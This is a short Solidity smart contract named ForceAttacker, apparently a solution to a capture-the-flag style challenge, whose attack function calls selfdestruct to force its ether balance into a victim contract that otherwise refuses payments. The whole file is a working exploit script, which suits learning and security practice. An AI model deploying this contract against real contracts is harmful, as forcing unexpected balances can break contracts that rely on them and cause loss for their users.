pragma solidity ^0.8.0;

contract ForceAttacker {
    constructor() {}

    function attack(address payable _victim) public {
        selfdestruct(_victim);
    }

    receive() external payable {}
}
